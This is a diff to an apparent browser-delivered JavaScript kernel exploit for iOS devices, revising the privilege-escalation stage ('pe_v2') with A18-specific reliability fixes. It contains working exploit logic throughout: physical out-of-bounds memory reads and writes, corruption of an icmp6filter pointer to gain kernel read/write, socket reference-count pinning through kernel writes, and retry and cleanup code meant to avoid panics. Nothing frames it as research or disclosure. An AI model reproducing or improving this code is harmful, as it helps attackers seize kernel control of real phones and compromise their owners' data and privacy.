@@ -1,7 +1,9 @@
 (() => {
-  const LS_PE_PAYLOAD_REVISION = "20260904.7";
+  const LS_PE_PAYLOAD_REVISION = "20260904.8";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
+  const PE_A18_SCAN_BUDGET_MS = 120000;
+  const PE_A18_CORRUPT_MAX_ATTEMPTS = 16;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
   try {
     if (PE_ENABLE_DEBUG_NETWORK && typeof XMLHttpRequest !== 'undefined') {
@@ -1715,7 +1717,12 @@
     pending_krw_socket_ports = [];
     krw_persist_log("pending-fileports-released", "count=" + released);
   }
-  function krw_sockets_leak_forever() {
+  function krw_sockets_leak_forever(release_pending_ports = true) {
+    if (krw_socket_pin_active) {
+      LOG("[KRW-STASH] Lara-style socket pin already active");
+      if (release_pending_ports) release_pending_krw_socket_ports();
+      return true;
+    }
     krw_persist_log("socket-pin-start", "control_pcb=" + control_socket_pcb.hex() + " rw_pcb=" + rw_socket_pcb.hex());
     let control_socket_addr = early_kread64(control_socket_pcb + OFFSET_PCB_SOCKET);
     let rw_socket_addr = early_kread64(rw_socket_pcb + OFFSET_PCB_SOCKET);
@@ -1729,6 +1736,11 @@
     let rw_socket_so_count = early_kread64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
     LOG("[KRW-STASH] pinning socket usecounts control=" + control_socket_so_count.hex() +
         " rw=" + rw_socket_so_count.hex());
+    if (is_a18_devices &&
+        (control_socket_so_count == 0n || rw_socket_so_count == 0n ||
+         control_socket_so_count > 0xffffffffn || rw_socket_so_count > 0xffffffffn)) {
+      throw new Error("A18 socket usecount sanity check failed");
+    }
     krw_pin_control_socket_addr = control_socket_addr;
     krw_pin_rw_socket_addr = rw_socket_addr;
     krw_pin_control_socket_count = control_socket_so_count;
@@ -1738,15 +1750,27 @@
     early_kwrite64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT,
                    rw_socket_so_count + KRW_LEAK_DELTA);
     early_kwrite64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n, 0n);
+    if (is_a18_devices) {
+      let observed_control = early_kread64(control_socket_addr + OFFSET_SOCKET_SO_COUNT);
+      let observed_rw = early_kread64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
+      let observed_filter_next = early_kread64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n);
+      if (observed_control != control_socket_so_count + KRW_LEAK_DELTA ||
+          observed_rw != rw_socket_so_count + KRW_LEAK_DELTA ||
+          observed_filter_next != 0n) {
+        throw new Error("A18 socket pin read-back failed");
+      }
+      LOG("[PE-A18] verified early socket pin read-back");
+    }
     krw_socket_pin_active = true;
     krw_persist_log("socket-pin-writes-done", "control_count_before=" + control_socket_so_count.hex() +
         " control_count_after=" + (control_socket_so_count + KRW_LEAK_DELTA).hex() +
         " rw_count_before=" + rw_socket_so_count.hex() +
         " rw_count_after=" + (rw_socket_so_count + KRW_LEAK_DELTA).hex() +
         " rw_filter_next_cleared=1");
-    release_pending_krw_socket_ports();
+    if (release_pending_ports) release_pending_krw_socket_ports();
     LOG("[KRW-STASH] Lara-style socket pin active");
     krw_persist_log("socket-pin-active");
+    return true;
   }
   function spray_socket(socket_ports, socket_pcb_ids) {
     if (is_a18_devices) {
@@ -1822,7 +1846,7 @@
     let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
     CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
     let surface = IOSurfaceCreate(properties);
-    IOSurfacePrefetchPages(surface);
+    if (surface != 0n) IOSurfacePrefetchPages(surface);
     free(address_ptr);
     free(size_ptr);
     CFRelease(address_number);
@@ -1833,7 +1857,13 @@
   let mlock_dict = {};
   function surface_mlock(address, size) {
     let surf = create_surface_with_address(address, size);
+    if (surf == 0n) {
+      LOG((is_a18_devices ? "[PE-A18]" : "[-]") +
+          " IOSurface lock creation failed address=" + address.hex() + " size=" + size.hex());
+      return false;
+    }
     mlock_dict[address] = surf;
+    return true;
   }
   function surface_munlock(address, size) {
     if (mlock_dict[address] != undefined) {
@@ -1961,6 +1991,7 @@
       let restored_filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
       let restored_cksum = uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n);
       if (restored_filter == original_filter && restored_cksum == original_cksum) {
+        krw_restore_snapshot_clear();
         LOG("[PE-A18] restored rejected control filter before socket release");
         return true;
       }
@@ -2143,6 +2174,7 @@
       let selected_control_port = socket_ports[control_socket_idx];
       let selected_rw_port = socket_ports[control_socket_idx + 0x1n];
       LOG("[+] Corrupting icmp6filter pointer...");
+      let corrupt_attempt = 0;
       while (true) {
         physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
         if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
@@ -2154,6 +2186,15 @@
         if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
           LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
           break;
+        }
+        corrupt_attempt++;
+        if (is_a18_devices && corrupt_attempt >= PE_A18_CORRUPT_MAX_ATTEMPTS) {
+          LOG("[PE-A18] corruption retry budget exhausted attempts=" + corrupt_attempt);
+          let restored = restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
+                                                      pcb_start_offset, icmp6filt_offset,
+                                                      icmp6filter, control_orig_cksum);
+          if (!restored) return mark_a18_cleanup_unsafe(selected_control_port);
+          return -1n;
         }
       }
       let sock = fileport_makefd(selected_control_port);
@@ -2197,6 +2238,23 @@
         rw_socket = candidate_rw_socket;
         pending_krw_socket_ports = [selected_control_port, selected_rw_port];
         LOG("[KRW-STASH] selected socket fileports retained until Lara-style pin");
+        if (is_a18_devices) {
+          // A18 can panic if this process tears down the corrupted filter before
+          // the normal post-pe_v2 pin point. Hold and pin the pair immediately.
+          krw_begin_provider_hold("A18 KRW pair activated");
+          try {
+            control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
+            if (!is_kernel_pointer(control_socket_pcb)) {
+              throw new Error("invalid control PCB during early pin");
+            }
+            krw_sockets_leak_forever(false);
+            krw_persist_log("a18-early-pin-ready", "control_pcb=" + control_socket_pcb.hex() +
+                " rw_pcb=" + rw_socket_pcb.hex());
+          } catch (e) {
+            LOG("[PE-A18] early socket pin failed: " + String(e));
+            return mark_a18_cleanup_unsafe(selected_control_port);
+          }
+        }
         if (LS_RETAIN_KRW_FOR_VISIBLE_TEST) {
           retained_socket_ports = [
             selected_control_port,
@@ -2373,13 +2431,20 @@
         } while (kr != KERN_SUCCESS);
       }
       wired_mapping_entries_addresses.push(wired_address);
-      surface_mlock(wired_address, wired_mapping_entry_size);
+      if (!surface_mlock(wired_address, wired_mapping_entry_size)) {
+        LOG("[PE-A18] aborting acquisition after wired IOSurface lock failure");
+        return false;
+      }
       uwrite64(wired_address, wired_page_marker);
       uwrite64(wired_address + 0x8n, wired_address);
     }
     let target_inp_gencnt_list = [];
     LOG("[i] Allocating memory done");
+    let acquisition_success = false;
+    let a18_scan_started = Date.now();
+    let a18_search_pass = 0;
     while (true) {
+      a18_search_pass++;
       let search_mapping_size = 0x800n * PAGE_SIZE;
       let search_mapping_address = new_bigint();
       kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
@@ -2390,7 +2455,11 @@
       for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
         uwrite64(search_mapping_address + k, random_marker);
       }
-      surface_mlock(search_mapping_address, search_mapping_size);
+      if (!surface_mlock(search_mapping_address, search_mapping_size)) {
+        LOG("[PE-A18] aborting acquisition after search IOSurface lock failure");
+        mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
+        break;
+      }
       let memory_object = new_bigint();
       let memory_object_size = BigInt(search_mapping_size);
       kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
@@ -2405,8 +2474,15 @@
       let split_count = 8n;
       let wired_pages = [];
       let success = false;
+      let scan_budget_exhausted = false;
       let seeking_offset = 0n;
       while (seeking_offset < search_mapping_size) {
+        if (is_a18_devices && Date.now() - a18_scan_started >= PE_A18_SCAN_BUDGET_MS) {
+          scan_budget_exhausted = true;
+          LOG("[PE-A18] scan budget exhausted pass=" + a18_search_pass +
+              " offset=" + seeking_offset.hex() + " budget_ms=" + PE_A18_SCAN_BUDGET_MS);
+          break;
+        }
         kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
         if (kr != KERN_SUCCESS) {
           seeking_offset += PAGE_SIZE;
@@ -2486,6 +2562,14 @@
       }
       kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       if (success == true) {
+        acquisition_success = true;
+        break;
+      }
+      if (is_a18_devices) {
+        // Do not retain another A18 search IOSurface after an exhausted pass.
+        // A new page launch is the retry boundary.
+        LOG("[PE-A18] ending acquisition without a validated pair pass=" + a18_search_pass +
+            " budget_exhausted=" + (scan_budget_exhausted ? "1" : "0"));
         break;
       }
     }
@@ -2498,6 +2582,7 @@
     } else {
       LOG("[PE-A18] preserved IOSurface locks to match Lara pe_a18");
     }
+    return acquisition_success;
   }
   function pe() {
     LOG("[PE-DBG] pe() entered");
@@ -2524,7 +2609,22 @@
       LOG("[PE-DBG] A18 settle sleep done; calling pe_init()");
       pe_init();
       LOG("[PE-DBG] pe_init() done, about to call pe_v2()...");
-      pe_v2();
+      if (pe_v2() !== true) {
+        LOG("[PE-A18] acquisition stopped safely without a validated socket pair");
+        try {
+          uwrite64(go_sync_ptr, 0n);
+          uwrite64(race_sync_ptr, 1n);
+          js_thread_join(free_thread_jsthread);
+          free_thread_jsthread = 0n;
+        } catch (e) {
+          LOG("[PE-A18] failed to stop physical R/W thread after scan abort: " + String(e));
+        }
+        if (write_fd > 0n && write_fd != 0xFFFFFFFFFFFFFFFFn) try { close(write_fd); } catch (_) {}
+        if (read_fd > 0n && read_fd != 0xFFFFFFFFFFFFFFFFn) try { close(read_fd); } catch (_) {}
+        write_fd = 0n;
+        read_fd = 0n;
+        throw new Error("A18 acquisition ended without a validated socket pair; retry the full chain");
+      }
     } else {
       LOG("[PE-DBG] non-A18 branch selected");
       LOG("[+] Running on non-A18 Devices");
